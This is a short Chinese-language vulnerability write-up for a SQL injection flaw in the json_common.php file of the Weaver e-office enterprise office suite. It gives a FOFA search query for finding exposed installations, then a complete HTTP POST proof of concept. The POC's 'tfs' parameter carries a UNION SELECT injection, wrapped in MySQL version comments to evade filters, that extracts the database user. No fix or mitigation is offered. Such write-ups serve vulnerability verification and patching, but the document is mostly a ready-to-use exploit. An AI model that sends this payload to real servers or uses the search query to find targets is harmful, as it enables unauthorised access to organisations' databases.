一、漏洞描述
泛微e-office为企业办公提供丰富应用，覆盖常见协作场景，开箱即用。满足人事、行政、财务、销售、运营、市场等不同部门协作需求，帮助组织高效管事理人。
系统 json_common.php 文件存在SQL注入漏洞
二、网络空间搜索引擎搜索
fofa查询
app="泛微-EOffice"
三、漏洞复现
POC
POST /building/json_common.php HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: LOGIN_LANG=cn; PHPSESSID=bd702adc830fba4fbcf5f336471aeb2e
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
 
tfs=city` where cityId =-1 /*!50000union*/ /*!50000select*/1,2,user() ,4#|2|333